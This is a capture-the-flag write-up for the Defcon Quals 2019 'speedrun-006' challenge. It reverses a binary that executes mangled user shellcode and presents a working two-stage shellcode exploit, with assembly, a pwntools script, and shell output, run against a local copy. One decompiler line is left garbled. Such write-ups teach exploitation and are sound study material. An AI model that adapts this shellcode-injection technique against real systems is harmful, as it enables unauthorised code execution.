# Defcon Quals 2019 Speedrun-006


Let's take a look at the binary:
```
$    file speedrun-006
speedrun-006: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=69951b1d604dac8a5508bc53540205548e7af1c1, not stripped
$    pwn checksec speedrun-006
[*] '/Hackery/defcon/s6/speedrun-006'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./speedrun-006
How good are you around the corners?
Send me your ride
15935728
You ain't ready.
guyinatuxedo@tux:/Hackery/defcon/s6$
```

SO we can see that it is a `64` bit binary with all of the standard binary mitigations, that prompts us for input when we run it. Looking at the main function in Ghidra, we see this:

```
undefined8 main(undefined4 uParm1,undefined8 uParm2)

{
  char *pcVar1;
  long in_FS_OFFSET;
  undefined local_78 [80];
  undefined8 local_28;
  undefined4 local_1c;
  long local_10;
 
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = uParm2;
  local_1c = uParm1;
  setvbuf(stdout,(char *)0x0,2,0);
  pcVar1 = getenv("DEBUG");
  if (pcVar1 == (char *)0x0) {
    alarm(5);
  }
  say_hello(local_78);
  get_that_shellcode();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Looking through the code, the `get_that_shellcode` function seems to be the only thing that really interests us.

```
void get_that_shellcode(void)

{
  long lVar1;
  ssize_t bytesRead;
  size_t len;
  long in_FS_OFFSET;
  char input [26];
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Send me your ride");
  bytesRead = read(0,input,0x1a);
  if ((int)bytesRead == 0x1a) {
    len = strlen(input);
    if (len == 0x1a) {
      shellcode_it(input,0x1a);
    }
    else {
      puts("You\'re not up to code.");
    }
  }
  else {
    puts("You ain\'t ready.");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looking through the `get_that_shellcode` function, we see that it scans in `0x1a` bytes of data into `buf`. If it scans in `26` bytes (and none of them can be null bytes because it checks with a `strlen` call) it will run the `shellcode_it` function with our input as the argument:

```

/* WARNING: Could not reconcile some variable overlaps */

void shellcode_it(undefined5 *puParm1)

{
  long lVar1;
  undefined8 uVar2;
  undefined5 uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  undefined8 *shellcode;
  long in_FS_OFFSET;
  undefined2 uStack50;
  undefined2 uStack48;
  undefined5 uStack45;
  undefined4 uStack40;
  undefined4 local_24;
  undefined4 uStack32;
  undefined uStack28;
 
  uVar9 = clean._40_8_;
  uVar8 = clean._32_8_;
  uVar7 = clean._24_8_;
  uVar6 = clean._16_8_;
  uVar5 = clean._8_8_;
  uVar4 = clean._0_8_;
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  uVar3 = *puParm1;
  uStack50 = (undefined2)*(undefined4 *)(puParm1 + 1);
  uStack48 = (undefined2)((uint)*(undefined4 *)(puParm1 + 1) >> 0x10);
  uStack45 = (undefined5)*(undefined8 *)((long)puParm1 + 9);
  uStack40 = CONCAT13(*(undefined *)((long)puParm1 + 0x11),
                      (int3)((ulong)*(undefined8 *)((long)puParm1 + 9) >> 0x28));
  uVar2 = *(undefined8 *)((long)puParm1 + 0x12);
  uStack32 = (undefined4)((ulong)uVar2 >> 0x18);
  uStack28 = (undefined)((ulong)uVar2 >> 0x38);
  local_24 = CONCAT31((int3)uVar2,0xcc);
  shellcode = (undefined8 *)mmap((void *)0x0,0x4e,7,0x22,-1,0);
  *shellcode = uVar4;
  shellcode[1] = uVar5;
  shellcode[2] = uVar6;
  shellcode[3] = uVar7;
  shellcode[4] = uVar8;
  shellcode[5] = uVar9;
  shellcode[6] = CONCAT26(uStack50,CONCAT15(0xcc,uVar3));
  shellcode[7] = CONCAT53(uStack45,CONCAT12(0xcc,uStack48));
  shellcode[8] = CONCAT44(local_24,uStack40);
  *(undefined4 *)(shellcode + 9) = uStack32;
  *(undefined2 *)((long)shellcode + 0x4c) = CONCAT11(0xcc,uStack28);
  (*(code *)shellcode)();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

rn *MK_FP(__FS__, 40LL) ^ v1;
}
```

So this function will run our shellcode. However before it does that it will alter our shellcode. It will append a bunch of xor statements before our shellcode, which will clear out all of the registers except for the rip register (this includes rsp, so we can't push/pop without crashing). In addition to that, it will insert the `0xcc` byte four times throughout our shellcode (at offsets 5, 10, 20, & 29). It may be a bit hard to tell here, however if we check with gdb it will tell us everything (that's how I reversed it when I first solved this). I will set a breakpoint for where our shellcode starts executing and look at what the shellcode is:

```
gef➤  b *shellcode_it+325
Breakpoint 1 at 0x9fe
gef➤  r
Starting program: /Hackery/pod/modules/crafting_shellcodePt1/defconquals19_s6/speedrun-006
How good are you around the corners?
Send me your ride
00000000
Program received signal SIGALRM, Alarm clock.
00000000000000000
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x3030303030cc3030
$rdx   : 0x00007ffff7ff6000  →  0x3148e43148ed3148
$rsp   : 0x00007fffffffdd10  →  0x0000001a55554bed
$rbp   : 0x00007fffffffdd90  →  0x00007fffffffdde0  →  0x00007fffffffde60  →  0x0000555555554b40  →  <__libc_csu_init+0> push r15
$rsi   : 0x4e              
$rdi   : 0x0               
$rip   : 0x00005555555549fe  →  <shellcode_it+325> call rdx
$r8    : 0xffffffff        
$r9    : 0x0               
$r10   : 0x22              
$r11   : 0x246             
$r12   : 0x0000555555554790  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf40  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd10│+0x0000: 0x0000001a55554bed   ← $rsp
0x00007fffffffdd18│+0x0008: 0x00007fffffffddb0  →  "0000000000000000000000000"
0x00007fffffffdd20│+0x0010: 0x00007ffff7ff6000  →  0x3148e43148ed3148
0x00007fffffffdd28│+0x0018: 0x00007ffff7ff6000  →  0x3148e43148ed3148
0x00007fffffffdd30│+0x0020: 0x3148e43148ed3148
0x00007fffffffdd38│+0x0028: 0x48c93148db3148c0
0x00007fffffffdd40│+0x0030: 0xff3148f63148d231
0x00007fffffffdd48│+0x0038: 0x314dc9314dc0314d
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555549f1 <shellcode_it+312> mov    QWORD PTR [rbp-0x68], rax
   0x5555555549f5 <shellcode_it+316> mov    rdx, QWORD PTR [rbp-0x68]
   0x5555555549f9 <shellcode_it+320> mov    eax, 0x0
 → 0x5555555549fe <shellcode_it+325> call   rdx
   0x555555554a00 <shellcode_it+327> nop    
   0x555555554a01 <shellcode_it+328> mov    rax, QWORD PTR [rbp-0x8]
   0x555555554a05 <shellcode_it+332> xor    rax, QWORD PTR fs:0x28
   0x555555554a0e <shellcode_it+341> je     0x555555554a15 <shellcode_it+348>
   0x555555554a10 <shellcode_it+343> call   0x555555554730 <__stack_chk_fail@plt>
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x7ffff7ff6000 (
   $rdi = 0x0000000000000000,
   $rsi = 0x000000000000004e,
   $rdx = 0x00007ffff7ff6000 → 0x3148e43148ed3148
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-006", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555549fe → shellcode_it()
[#1] 0x555555554a9c → get_that_shellcode()
[#2] 0x555555554b24 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00005555555549fe in shellcode_it ()
gef➤  x/20i $rdx
   0x7ffff7ff6000:  xor    rbp,rbp
   0x7ffff7ff6003:  xor    rsp,rsp
   0x7ffff7ff6006:  xor    rax,rax
   0x7ffff7ff6009:  xor    rbx,rbx
   0x7ffff7ff600c:  xor    rcx,rcx
   0x7ffff7ff600f:  xor    rdx,rdx
   0x7ffff7ff6012:  xor    rsi,rsi
   0x7ffff7ff6015:  xor    rdi,rdi
   0x7ffff7ff6018:  xor    r8,r8
   0x7ffff7ff601b:  xor    r9,r9
   0x7ffff7ff601e:  xor    r10,r10
   0x7ffff7ff6021:  xor    r11,r11
   0x7ffff7ff6024:  xor    r12,r12
   0x7ffff7ff6027:  xor    r13,r13
   0x7ffff7ff602a:  xor    r14,r14
   0x7ffff7ff602d:  xor    r15,r15
   0x7ffff7ff6030:  xor    BYTE PTR [rax],dh
   0x7ffff7ff6032:  xor    BYTE PTR [rax],dh
   0x7ffff7ff6034:  xor    ah,cl
   0x7ffff7ff6036:  xor    BYTE PTR [rax],dh
gef➤  x/4g 0x7ffff7ff6030
0x7ffff7ff6030: 0x3030cc3030303030  0x3030303030cc3030
0x7ffff7ff6040: 0x303030cc30303030  0x0000cc0a30303030
```

We see that the xoring the registers to zero ends at `0x7ffff7ff60300`, which is where we can see is where our input starts (which our input was 25 `0`s followed by a newline character). In addition to that, we can see that it did insert a `0xcc` byte at offsets `5, 10, 20, & 29`.

So what I ended up doing was using two sets of shellcode. The first was just to make a syscall to read to scan in additional shellcode (since the shellcode to pop a shell would be harder to fit in due to the constraints). Then I would just scan in the shellcode to pop a shell without the size / no null bytes / 0xcc inserted restrictions, and then jump to it. I tried for a little bit to just get the shell using only one set of shellcode, however I couldn't do it.

Here is the shellcode that I used to scan it in (with the `0xcc` bytes inserted). There are a lot of nops to ensure the `0xcc` don't mess with any instructions. This shellcode will scan in data with a read syscall (more info here: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ ). Also for this, the `rax` register is already set to `0x0` to specify a read syscall so we don't need to edit it. In addition to that the `rdi` register is also set to `0x0` which specifies stdin as a result of the xoring that takes place before our shellcode, so the only registers we need to worry about is that of `rsi` which points to where the data will be scanned in and `rdx` which holds the size for the amount of data to be scanned in. For `rdx` I just move in the value `0xff` which gives us more than enough room. For where to scan in our shellcode, I choose the same memory region that our shellcode runs in. The permissions on it are `rwx` so we won't have a problem writing and executing to it, plus the `rip` register will hold a pointer to it. Plus we have a pointer to that region in the `rip` register. I just moved the contents of the `rip` register (minus a little bit) into the `rsi` register, then added `0x43` to it. That way it moved where the new shellcode will be scanned in past this shellcode, and we won't overwrite this shellcode with the new one. Then I just jumped to `rsi` since that holds a pointer to where our new shellcode is:

```
gef➤  x/20i $rip
=> 0x7f6e87b34030:    mov    dl,0xff
   0x7f6e87b34032:    nop
   0x7f6e87b34033:    nop
   0x7f6e87b34034:    nop
   0x7f6e87b34035:    int3   
   0x7f6e87b34036:    nop
   0x7f6e87b34037:    nop
   0x7f6e87b34038:    nop
   0x7f6e87b34039:    nop
   0x7f6e87b3403a:    int3   
   0x7f6e87b3403b:    lea    rsi,[rip+0xfffffffffffffff8]        # 0x7f6e87b3403a
   0x7f6e87b34042:    nop
   0x7f6e87b34043:    nop
   0x7f6e87b34044:    int3   
   0x7f6e87b34045:    add    rsi,0x43
   0x7f6e87b34049:    syscall
   0x7f6e87b3404b:    jmp    rsi

```

Then here is the shellcode I used to actually get a shell via an execve syscall to `/bin/sh` (remember I couldn't use pop/push). Checking the syscall chart there are four registers we need to set. I set `rax` to `0x3b` to specify an execve syscall, I set `rdi` to be a ptr to `/bin/sh`, and set `rsi` and `rdx` to zero:

```
gef➤  x/7i $rip
=> 0x7fc1735c607d:    mov    al,0x3b
   0x7fc1735c607f:    lea    rdi,[rip+0xfffffffffffffff8]        # 0x7fc1735c607e
   0x7fc1735c6086:    movabs rcx,0x68732f6e69622f
   0x7fc1735c6090:    mov    QWORD PTR [rdi],rcx
   0x7fc1735c6093:    xor    rsi,rsi
   0x7fc1735c6096:    xor    rdx,rdx
   0x7fc1735c6099:    syscall
```

Also to assemble the assembly code into opcodes, I just used nasm. Here's an example assembling the assembly file `shellcode.asm`

```
$ cat scan.asm
[SECTION .text]
global _start
_start:
  mov dl, 0xff
  lea rsi, [rel $ +0xffffffffffffffff ]
  add rsi, 0x43
  syscall
  jmp rsi
$ cat shellcode.asm
[SECTION .text]
global _start
_start:
  mov al, 0x3b
  lea rdi, [rel $ +0xffffffffffffffff ]
  mov rcx, 0x68732f6e69622f
  mov [rdi], rcx
  xor rsi, rsi
  xor rdx, rdx
  syscall
$ nasm -f elf64 scan.asm
$ ld -o scan scan.o
$ nasm -f elf64 shellcode.asm
$ ld -o shellcode shellcode.o
$ objdump -D scan -M intel

scan:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080: b2 ff                 mov    dl,0xff
  400082: 48 8d 35 f8 ff ff ff  lea    rsi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
  400089: 48 83 c6 43           add    rsi,0x43
  40008d: 0f 05                 syscall
  40008f: ff e6                 jmp    rsi
$ objdump -D shellcode -M intel

shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080: b0 3b                 mov    al,0x3b
  400082: 48 8d 3d f8 ff ff ff  lea    rdi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
  400089: 48 b9 2f 62 69 6e 2f  movabs rcx,0x68732f6e69622f
  400090: 73 68 00
  400093: 48 89 0f              mov    QWORD PTR [rdi],rcx
  400096: 48 31 f6              xor    rsi,rsi
  400099: 48 31 d2              xor    rdx,rdx
  40009c: 0f 05                 syscall
```

Putting it all together, we get the following exploit:
```
from pwn import *

target = process('speedrun-006')
gdb.attach(target, gdbscript='pie b *0x9fe')

'''
shellcode to scan in additional shellcode
0000000000400080 <_start>:
  400080:   b2 ff                   mov    dl,0xff
  400082:   48 8d 35 f8 ff ff ff    lea    rsi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
  400089:   48 83 c6 43             add    rsi,0x43
  40008d:   0f 05                   syscall
  40008f:   ff e6                   jmp    rsi
'''

# mov    dl,0xff
scan = "\xb2\xff"

# nops
scan += "\x90\x90\x90\x90\x90\x90\x90"

# lea    rsi,[rip+0xfffffffffffffff8]
scan += "\x48\x8d\x35\xf8\xff\xff\xff"

# nops
scan += "\x90"*2

# add    rsi,0x43
scan += "\x48\x83\xc6\x43"

# syscall
scan += "\x0f\x05"

# jmp rsi
scan += "\xff\xe6"

# send the shellcode, and pause to ensure input is scanned in correctly
target.send(scan)
raw_input()

'''
Secondary shellcode to pop a shell without push/pop
0000000000400080 <_start>:
  400080:   b0 3b                   mov    al,0x3b
  400082:   48 8d 3d f8 ff ff ff    lea    rdi,[rip+0xfffffffffffffff8]        
  400089:   48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f6e69622f
  400090:   73 68 00
  400093:   48 89 0f                mov    QWORD PTR [rdi],rcx
  400096:   48 31 f6                xor    rsi,rsi
  400099:   48 31 d2                xor    rdx,rdx
  40009c:   0f 05                   syscall
'''
# mov    al,0x3b
shellcode = "\xb0\x3b"

# lea    rdi,[rip+0xfffffffffffffff8]
shellcode += "\x48\x8d\x3d\xf8\xff\xff\xff"

# movabs rcx,0x68732f6e69622f
shellcode += "\x48\xb9\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x00"

# mov    QWORD PTR [rdi],rcx
shellcode += "\x48\x89\x0f"

#xor    rsi,rsi
shellcode += "\x48\x31\xf6"

#xor    rdx,rdx
shellcode += "\x48\x31\xd2"

#syscall
shellcode += "\x0f\x05"

# Send the secondary shellcode
target.send(shellcode)

target.interactive()
```

When we run it:
```
$ python exploit.py
[!] Could not find executable 'speedrun-006' in $PATH, using './speedrun-006' instead
[+] Starting local process './speedrun-006': pid 9419
[*] running in new terminal: /usr/bin/gdb -q  "./speedrun-006" 9419 -x "/tmp/pwnE1hBZ0.gdb"
[+] Waiting for debugger: Done
w
[*] Switching to interactive mode
How good are you around the corners?
Send me your ride
$ w
$ w
 02:12:55 up  1:35,  1 user,  load average: 0.56, 0.60, 0.63
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               00:40   ?xdm?   9:17   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
core  exploit.py  readme.md  scan.asm  shellcode.asm  speedrun-006
$
[*] Interrupted
[*] Stopped process './speedrun-006' (pid 9419)
```

Just like that, we got a shell. Although how I handles I/O lead to a bit of a weird exploitation process (I needed to use `raw_input()` as a pause).